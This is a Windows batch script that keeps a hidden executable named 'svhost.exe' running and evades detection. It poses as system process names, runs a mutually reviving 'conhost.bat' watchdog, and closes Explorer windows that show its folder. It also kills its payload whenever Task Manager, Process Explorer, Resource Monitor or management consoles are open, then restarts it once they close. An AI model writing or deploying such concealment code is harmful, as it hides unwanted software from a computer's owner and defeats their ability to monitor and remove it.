@echo off
setlocal EnableDelayedExpansion

:: Setup paths
set "SCRIPT_DIR=%~dp0"
set "SCRIPT_DIR_NOP=%SCRIPT_DIR:~0,-1%"

:: ====================================================
:: CONFIGURATION
:: ====================================================
set "EXE_NAME=svhost.exe"
set "APP_PATH=%SCRIPT_DIR%%EXE_NAME%"
set "APP_BASENAME=svhost"
set "HB_FILE_1=%SCRIPT_DIR%shutdown_hb.tmp"
set "HB_FILE_2=%SCRIPT_DIR%guard_hb.tmp"

:: Get parent directory path for Explorer check
for %%I in ("%SCRIPT_DIR%..") do set "PARENT_DIR=%%~fI"

if not exist "%APP_PATH%" (
    echo Error: Could not find '%EXE_NAME%' in this folder.
    goto :end
)

echo Monitoring started...

:MAIN_LOOP
:: Update heartbeats
echo %DATE% %TIME% > "%HB_FILE_1%"
echo %DATE% %TIME% > "%HB_FILE_2%"

:: --- MUTUAL PROTECTION: Check & Revive/Enforce Single Instance of conhost.bat ---
powershell -NoProfile -Command ^
    "$procs = @(Get-CimInstance Win32_Process -Filter \"Name='cmd.exe'\" | Where-Object { $_.CommandLine -like '*conhost.bat*' });" ^
    "if ($procs.Count -eq 0) {" ^
    "    Start-Process -FilePath '%SCRIPT_DIR%conhost.bat' -WorkingDirectory '%SCRIPT_DIR_NOP%' -WindowStyle Hidden;" ^
    "} elseif ($procs.Count -gt 1) {" ^
    "    $sorted = $procs | Sort-Object CreationDate;" ^
    "    for ($i = 0; $i -lt $sorted.Count - 1; $i++) {" ^
    "        Stop-Process -Id $sorted[$i].ProcessId -Force -ErrorAction SilentlyContinue;" ^
    "    }" ^
    "}"


:: --- PART A: Fully Robust Continuous Explorer Window Guard ---
powershell -NoProfile -Command ^
    "$targetFolder = [System.IO.Path]::GetFullPath('%PARENT_DIR%').TrimEnd('\');" ^
    "try {" ^
    "    $shell = New-Object -ComObject Shell.Application;" ^
    "    foreach ($window in $shell.Windows()) {" ^
    "        try {" ^
    "            $doc = $window.Document;" ^
    "            if ($doc -and $doc.Folder) {" ^
    "                $folderPath = $doc.Folder.Self.Path.TrimEnd('\');" ^
    "                if ($folderPath -eq $targetFolder -or $folderPath.StartsWith($targetFolder + '\', [System.StringComparison]::OrdinalIgnoreCase)) {" ^
    "                    $window.Quit();" ^
    "                }" ^
    "            }" ^
    "        } catch {}" ^
    "    } " ^
    "    [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell);" ^
    "} catch {}" >nul 2>&1


:: --- PART B: Taskmgr / Procexp / Perfmon (Resource Monitor/Firewall/MMC) Detection & svhost Handler ---
set "VISIBLE_MONITOR=0"

:: Added 'mmc' and 'control' as well just in case firewall or advanced system windows are opened via management consoles
for /f "usebackq" %%i in (`powershell -NoProfile -Command "Get-Process -Name 'Taskmgr','procexp','procexp64','perfmon','mmc','control' -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 } | Select-Object -ExpandProperty Id"`) do (
    set "VISIBLE_MONITOR=1"
)

if "%VISIBLE_MONITOR%"=="1" (
    :: Target app found active? Kill it immediately.
    tasklist /fi "IMAGENAME eq %EXE_NAME%" 2>NUL | find /i "%EXE_NAME%" >NUL
    if not errorlevel 1 (
        taskkill /f /im "%EXE_NAME%" >nul 2>&1
    )
) else (
    :: If no monitoring tools are open, ensure svhost.exe is running
    tasklist /fi "IMAGENAME eq %EXE_NAME%" 2>NUL | find /i "%EXE_NAME%" >NUL
    if errorlevel 1 (
        powershell -NoProfile -Command "Start-Process -FilePath '%APP_PATH%' -WorkingDirectory '%SCRIPT_DIR_NOP%' -WindowStyle Hidden"
    )
)

:: Check every 1 second continuously without any blocking 60-second delays
timeout /t 1 /nobreak >nul

goto MAIN_LOOP

:end
endlocal